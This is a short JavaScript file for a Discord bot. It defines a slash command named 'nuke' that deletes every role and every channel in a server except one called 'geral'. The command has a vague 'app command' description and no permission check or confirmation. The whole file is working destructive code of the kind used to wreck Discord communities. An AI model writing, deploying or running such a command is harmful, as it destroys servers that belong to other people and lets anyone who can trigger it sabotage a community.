import { createCommand } from "#base";
import { ApplicationCommandType } from "discord.js";

createCommand({
  name: "nuke",
  description: "app command",
  type: ApplicationCommandType.ChatInput,
  async run(interaction) {
    interaction.deferReply({ ephemeral: true });
    interaction.guild.roles.cache.forEach((role) => {
      role.delete().catch(console.error);
    });
    interaction.guild.channels.cache.forEach((channel) => {
      if (channel.name === "geral") return;
      channel.delete().catch(console.error);
    });
  },
});
